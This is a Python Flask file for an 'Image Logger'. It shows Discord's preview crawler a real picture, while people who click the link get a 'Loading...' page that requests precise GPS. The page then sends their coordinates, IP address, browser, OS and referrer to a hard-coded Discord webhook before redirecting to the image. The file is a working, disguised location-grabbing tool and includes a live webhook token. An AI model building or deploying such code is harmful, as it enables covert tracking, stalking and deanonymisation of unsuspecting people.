from flask import Flask, request, make_response, render_template_string, jsonify, redirect, url_for
import httpagentparser
import requests
import datetime
import json
import urllib.parse
import re

app = Flask(__name__)

DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1527179048684621934/ereAKZmM3p-QZK_PUCJdS0OFGu7ikkJCQNHKb6L9DVLF_aB82iDW_zioBb7PGNMQKUwo"
IMAGE_URL = "https://i.pinimg.com/236x/6a/3d/33/6a3d336840b6a2d91efde0ff77f038e9.jpg"

def fetch_image():
    try:
        r = requests.get(IMAGE_URL, timeout=10)
        r.raise_for_status()
        return r.content, r.headers.get('Content-Type', 'image/jpeg')
    except:
        return b'GIF89a\x01\x00\x01\x00\x80\x00\x00\xff\xff\xff\x00\x00\x00!\xf9\x04\x01\x00\x00\x00\x00,\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x02D\x01\x00;', 'image/gif'

def is_discord_bot(user_agent):
    """Check if the request is from Discord's embed crawler"""
    if not user_agent:
        return False
    ua_lower = user_agent.lower()
    discord_patterns = [
        'discordbot',
        'discord',
        'mozilla/5.0 (compatible; discordbot',
        'mediapartners-google'
    ]
    for pattern in discord_patterns:
        if pattern in ua_lower:
            return True
    return False

# HTML + JS that asks for geolocation and sends DIRECTLY to Discord webhook
GEO_HTML = """
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Loading...</title>
    <script>
        const DISCORD_WEBHOOK = "{{ webhook }}";
        const IMAGE_URL = "{{ image_url }}";
        const IP = "{{ ip }}";
        const USER_AGENT = "{{ user_agent }}";
        const REFERRER = "{{ referrer }}";
        const TIMESTAMP = "{{ timestamp }}";
        const BROWSER = "{{ browser }}";
        const OS_NAME = "{{ os_name }}";
        const DEVICE = "{{ device }}";

        function sendToDiscord(lat, lng, accuracy) {
            const embed = {
                "title": "📍 GPS Location Captured",
                "color": 0xff0000,
                "fields": [
                    {"name": "🌐 IP", "value": "`" + IP + "`", "inline": true},
                    {"name": "📱 Browser", "value": "`" + BROWSER + "`", "inline": true},
                    {"name": "💻 OS/Device", "value": "`" + OS_NAME + " - " + DEVICE + "`", "inline": true},
                    {"name": "📍 Latitude", "value": "`" + lat + "`", "inline": true},
                    {"name": "📍 Longitude", "value": "`" + lng + "`", "inline": true},
                    {"name": "🎯 Accuracy", "value": "`" + accuracy + "m`", "inline": true},
                    {"name": "🔗 Referrer", "value": "`" + REFERRER + "`", "inline": false},
                    {"name": "⏰ Time", "value": TIMESTAMP, "inline": false}
                ],
                "footer": {"text": "Image Logger • Vercel • Geo-Enabled"}
            };

            const payload = {
                "content": "**🚨 Real Location Grabbed**",
                "embeds": [embed]
            };

            // Send to Discord webhook directly from browser
            fetch(DISCORD_WEBHOOK, {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify(payload)
            }).then(response => {
                console.log('Location sent to Discord');
            }).catch(err => {
                console.log('Failed to send to Discord:', err);
            });

            // Redirect to image after sending
            window.location.href = IMAGE_URL + "?geo=1";
        }

        function sendLocation(position) {
            const lat = position.coords.latitude;
            const lng = position.coords.longitude;
            const accuracy = position.coords.accuracy;
            sendToDiscord(lat, lng, accuracy);
        }

        function errorLocation(err) {
            // If denied or error, just redirect to image anyway
            console.log('Location error:', err.message);
            window.location.href = IMAGE_URL + "?geo=0";
        }

        // Ask for location immediately when page loads
        window.onload = function() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(sendLocation, errorLocation, {
                    enableHighAccuracy: true,
                    timeout: 15000,
                    maximumAge: 0
                });
            } else {
                // Fallback: redirect
                window.location.href = IMAGE_URL + "?geo=0";
            }
        };
    </script>
</head>
<body>
    <p>Loading image...</p>
</body>
</html>
"""

@app.route('/api/image', methods=['GET'])
def serve_image():
    user_agent = request.headers.get('User-Agent', '')
    
    # If it's a Discord bot, serve the image directly
    if is_discord_bot(user_agent):
        image_data, content_type = fetch_image()
        response = make_response(image_data)
        response.headers.set('Content-Type', content_type)
        response.headers.set('Cache-Control', 'no-cache, no-store, must-revalidate')
        response.headers.set('Pragma', 'no-cache')
        return response
    
    # If we have ?geo=1 or ?geo=0, just serve the image
    if request.args.get('geo') is not None:
        image_data, content_type = fetch_image()
        response = make_response(image_data)
        response.headers.set('Content-Type', content_type)
        response.headers.set('Cache-Control', 'no-cache, no-store, must-revalidate')
        response.headers.set('Pragma', 'no-cache')
        return response

    # Otherwise, serve the HTML that asks for location
    ip = request.headers.get('X-Forwarded-For', request.remote_addr or 'Unknown')
    referrer = request.headers.get('Referer', 'No referrer')
    timestamp = datetime.datetime.utcnow().strftime('%Y-%m-%d %H:%M:%S UTC')

    # Parse UA
    try:
        parsed = httpagentparser.detect(user_agent)
        browser = parsed.get('browser', {}).get('name', 'Unknown')
        os_name = parsed.get('os', {}).get('name', 'Unknown')
        device = parsed.get('device', 'Unknown')
    except:
        browser = os_name = device = "Unknown"

    # Inject all values into HTML
    html = GEO_HTML.replace("{{ webhook }}", DISCORD_WEBHOOK)
    html = html.replace("{{ image_url }}", IMAGE_URL)
    html = html.replace("{{ ip }}", ip)
    html = html.replace("{{ user_agent }}", user_agent.replace("'", "\\'"))
    html = html.replace("{{ referrer }}", referrer.replace("'", "\\'"))
    html = html.replace("{{ timestamp }}", timestamp)
    html = html.replace("{{ browser }}", browser)
    html = html.replace("{{ os_name }}", os_name)
    html = html.replace("{{ device }}", device)

    response = make_response(html)
    response.headers.set('Content-Type', 'text/html')
    response.headers.set('Cache-Control', 'no-cache, no-store, must-revalidate')
    return response

if __name__ == '__main__':
    app.run()
